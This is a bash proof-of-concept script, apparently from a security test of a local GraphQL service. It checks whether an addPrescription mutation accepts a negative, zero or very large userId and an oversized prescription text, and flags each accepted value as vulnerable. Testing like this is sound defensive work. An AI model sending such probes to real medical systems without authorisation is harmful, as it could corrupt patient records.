#!/bin/bash

# POC: Insufficient Input Validation in addPrescription GraphQL Mutation
# Demonstrates acceptance of invalid input values without validation
# Version 2: Fixed GraphQL query syntax

TARGET_URL="http://localhost:5003/graphql"

echo "=========================================="
echo "Testing Insufficient Input Validation in addPrescription Mutation"
echo "=========================================="
echo ""

# Test 1: Negative userId
echo "[Test 1] Testing negative userId (-1)..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { addPrescription(userId: -1, prescriptionDetails: \"Test prescription\") { prescription { userId prescriptionDetails } } }"
  }')

echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"userId":-1'; then
  echo "✓ VULNERABLE: Negative userId (-1) accepted without validation"
else
  echo "Response does not show userId validation"
fi
echo ""

# Test 2: Zero userId
echo "[Test 2] Testing zero userId (0)..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { addPrescription(userId: 0, prescriptionDetails: \"Test prescription\") { prescription { userId prescriptionDetails } } }"
  }')

echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"userId":0'; then
  echo "✓ VULNERABLE: Zero userId (0) accepted without validation"
else
  echo "Response does not show zero userId validation"
fi
echo ""

# Test 3: Extremely large userId
echo "[Test 3] Testing extremely large userId (999999)..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { addPrescription(userId: 999999, prescriptionDetails: \"Test prescription\") { prescription { userId prescriptionDetails } } }"
  }')

echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"userId":999999'; then
  echo "✓ VULNERABLE: Extremely large userId (999999) accepted without validation"
else
  echo "Response does not show large userId validation"
fi
echo ""

# Test 4: Very long prescriptionDetails (1000+ characters)
echo "[Test 4] Testing excessively long prescriptionDetails (1000+ characters)..."
LONG_DETAILS=$(python3 -c "print('A' * 1002)")
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  --data-binary @- << EOF
{
  "query": "mutation { addPrescription(userId: 1, prescriptionDetails: \"$LONG_DETAILS\") { prescription { userId prescriptionDetails } } }"
}
EOF
)

echo "Response (first 500 chars): ${RESPONSE:0:500}..."
if echo "$RESPONSE" | grep -q 'prescriptionDetails'; then
  STORED_LENGTH=$(echo "$RESPONSE" | grep -o 'prescriptionDetails":"[^"]*' | wc -c)
  echo "✓ VULNERABLE: Excessively long prescriptionDetails accepted without length validation"
  echo "  Stored details length: ~$STORED_LENGTH characters"
else
  echo "Response indicates length validation may be applied"
fi
echo ""

echo "=========================================="
echo "Summary: Testing Input Validation"
echo "=========================================="